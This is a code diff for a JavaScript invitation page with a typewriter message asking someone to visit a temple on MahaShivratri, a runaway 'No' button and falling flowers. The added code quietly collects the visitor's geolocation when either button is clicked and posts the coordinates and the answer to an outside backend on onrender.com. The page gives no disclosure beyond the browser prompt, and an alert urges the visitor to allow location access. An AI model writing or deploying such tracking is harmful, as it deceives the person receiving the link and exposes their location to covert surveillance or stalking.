@@ -1,97 +1,106 @@
-const noBtn = document.getElementById("noBtn");
-const text = document.getElementById("mainText");
-const bell = document.getElementById("bell");
-const flowersContainer = document.getElementById("flowers");
+    window.onload = () => {
+      // Elements
+      const noBtn = document.getElementById("noBtn");
+      const yesBtn = document.getElementById("yesBtn");
+      const text = document.getElementById("mainText");
+      const topText = document.getElementById("topText");
+      const bell = document.getElementById("bell");
+      const flowersContainer = document.getElementById("flowers");
 
+      // Typewriter Text
+      const line1 = "Yeh Valentine Day Kya hota hai...";
+      const line2 = "Kya tum mere saath MahaShivratri ke din Mandir chalogi? 🙏";
+      let i = 0, j = 0;
 
-/* No button runs away */
-function moveNo() {
-const x = Math.random() * (window.innerWidth - 100);
-const y = Math.random() * (window.innerHeight - 50);
+      function typeLine1() {
+        if (i < line1.length) {
+          topText.innerHTML += line1.charAt(i);
+          i++;
+          setTimeout(typeLine1, 50);
+        } else {
+          setTimeout(typeLine2, 500);
+        }
+      }
 
-noBtn.style.position = "fixed";
-noBtn.style.left = x + "px";
-noBtn.style.top = y + "px";
-}
+      function typeLine2() {
+        if (j < line2.length) {
+          text.innerHTML += line2.charAt(j);
+          j++;
+          setTimeout(typeLine2, 40);
+        }
+      }
 
-/* Yes click */
-function yesClick() {
-text.innerHTML = "Har Har Mahadev! 🙏<br>Chalo Mandir saath chalte hain ❤️";
-bell.play();
-startFlowers();
-}
+      // No button moves randomly
+      function moveNo() {
+        const x = Math.random() * (window.innerWidth - noBtn.offsetWidth);
+        const y = Math.random() * (window.innerHeight - noBtn.offsetHeight);
+        noBtn.style.left = x + "px";
+        noBtn.style.top = y + "px";
+      }
 
-/* Flower falling animation */
-function startFlowers() {
-for (let i = 0; i < 40; i++) {
-setTimeout(createFlower, i * 150);
-}
-}
+      // Flower animation
+      function startFlowers() {
+        for (let i = 0; i < 40; i++) {
+          setTimeout(createFlower, i * 150);
+        }
+      }
 
-function createFlower() {
-const flower = document.createElement("div");
-flower.classList.add("flower");
-flower.innerHTML = "🌸";
+      function createFlower() {
+        const flower = document.createElement("div");
+        flower.classList.add("flower");
+        flower.innerHTML = "🌸";
+        flower.style.left = Math.random() * window.innerWidth + "px";
+        flower.style.animationDuration = (3 + Math.random() * 3) + "s";
+        flowersContainer.appendChild(flower);
+        setTimeout(() => flower.remove(), 6000);
+      }
 
-flower.style.left = Math.random() * window.innerWidth + "px";
-flower.style.animationDuration = 3 + Math.random() * 3 + "s";
+      // Geolocation
+      function getUserLocation(status) {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                status: status
+              };
+              console.log("Sending location:", data);
+              sendToServer(data);
+            },
+            (error) => {
+              console.error("Error getting location:", error);
+              alert("Could not get your location. Please allow location access.");
+            }
+          );
+        } else {
+          alert("Geolocation is not supported by your browser.");
+        }
+      }
 
-flowersContainer.appendChild(flower);
+      // Send data to backend
+      function sendToServer(data) {
+        fetch("https://databackend-lllj.onrender.com/send-location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        })
+        .then(res => res.json())
+        .then(data => console.log("Server Response:", data))
+        .catch(err => console.log("Error:", err));
+      }
 
-setTimeout(() => {
-flower.remove();
-}, 6000);
-}
+      // Attach events
+      noBtn.addEventListener("mouseover", moveNo);
+      noBtn.addEventListener("click", () => getUserLocation("No"));
 
-// Text content
-const line1 = "Yeh Valentine Day Kya hota hai...";
-const line2 = "Kya tum mere saath MahaShivratri ke din Mandir chalogi? 🙏";
+      yesBtn.addEventListener("click", () => {
+        text.innerHTML = "Har Har Mahadev! 🙏<br>Chalo Mandir saath chalte hain ❤️";
+        bell.play();
+        startFlowers();
+        getUserLocation("Yes");
+      });
 
-const topText = document.getElementById("topText");
-const mainText = document.getElementById("mainText");
-
-let i = 0;
-let j = 0;
-
-// Type first line
-function typeLine1() {
-if (i < line1.length) {
-topText.innerHTML += line1.charAt(i);
-i++;
-setTimeout(typeLine1, 50);
-} else {
-setTimeout(typeLine2, 500); // small pause
-}
-}
-
-// Type second line
-function typeLine2() {
-if (j < line2.length) {
-mainText.innerHTML += line2.charAt(j);
-j++;
-setTimeout(typeLine2, 40);
-}
-}
-
-// Start typing when page loads
-window.onload = () => {
-typeLine1();
-};
-
-
-
-
-// BUTTON PROGRAM
-function sendToServer(data) {
-  fetch("https://your-backend-url.onrender.com/send-location", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(data)
-  })
-  .then(res => res.json())
-  .then(data => console.log(data))
-  .catch(err => console.log("Error:", err));
-}
-// EwsVlmjkeUkWEgrn
+      // Start typing
+      typeLine1();
+    };
